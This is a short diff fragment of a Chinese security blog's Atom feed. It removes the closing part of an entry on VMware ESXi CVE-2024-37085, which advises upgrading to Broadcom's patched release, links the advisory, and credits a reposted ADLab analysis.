-&lt;h2 id=&#34;漏洞修复&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h2&gt;
-&lt;p&gt;​	博通官方给了相关修复版本的 ESXi 下载链接和文档，将 ESXi 升级到最新的修复版本即可，补丁下载地址：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24505&#34;&gt;https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24505&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;文章转自启明星辰-adlabvmware-esxi-cve-2024-37085漏洞验证分析-qqcom&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文章转自启明星辰-adlabvmware-esxi-cve-2024-37085漏洞验证分析-qqcom&#34;&gt;#&lt;/a&gt; 文章转自启明星辰 [ADLab]：&lt;a href=&#34;https://mp.weixin.qq.com/s/IVgEogcJigvPCq5MI9eeyg&#34;&gt;VMware ESXi CVE-2024-37085 漏洞验证分析 (qq.com)&lt;/a&gt;&lt;/h3&gt;
-</content>
-        <category term="漏洞复现" />
-        <updated>2024-10-28T01:18:34.480Z</updated>
     </entry>
 </feed>
